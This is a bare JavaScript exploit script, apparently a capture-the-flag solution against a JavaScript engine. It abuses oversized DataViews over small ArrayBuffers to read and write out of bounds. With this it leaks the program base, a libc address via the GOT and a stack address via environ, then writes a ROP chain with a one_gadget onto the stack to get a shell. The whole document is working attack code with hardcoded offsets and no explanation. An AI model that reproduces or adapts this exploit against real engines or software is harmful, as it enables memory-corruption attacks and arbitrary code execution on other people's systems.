ab1 = new ArrayBuffer(0x10) // 0x5555555c1448
dv1 = new DataView(ab1, 0x0, 0x1000)
ab2 = new ArrayBuffer(0x10) // 0x5555555c14e0
dv2 = new DataView(ab2, 0x0, 0x1000)

dv1.setUint32(0x0, 0x41414141)
dv1.setUint32(0x4, 0x41414141)
dv2.setUint32(0x0, 0x42424242)
dv2.setUint32(0x4, 0x42424242)

hex = 16
base_offset = 0x6d4e0
base_addr = parseInt(dv1.getBigUint64(0xf8, true)) - base_offset
print("base_addr: 0x"+base_addr.toString(hex))

free_got = base_addr + 0x6bde0
dv1.setBigUint64(0xf8, free_got - 0x10, true)
libc_addr = parseInt(dv2.getBigUint64(0x0, true)) - 0x9d850
print("libc_addr: 0x"+libc_addr.toString(hex))

one_gadget = libc_addr + 0xe6c7e
pop_r12 = libc_addr + 0x32b59
exit = libc_addr + 0x49bc0

environ = libc_addr + 0x1ef2e0
print("environ: 0x"+environ.toString(hex))

dv1.setBigUint64(0xf8, environ - 0x10, true)
stack_addr = parseInt(dv2.getBigUint64(0x0, true)) - 0x108
print("stack_addr: 0x"+stack_addr.toString(hex))

dv1.setBigUint64(0xf8, stack_addr - 0x10, true)
dv2.setBigUint64(0x0, pop_r12, true)
dv2.setBigUint64(0x8, 0, true)
dv2.setBigUint64(0x10, one_gadget, true)
dv2.setBigUint64(0x18, exit, true)

// b *0x55555555d0f1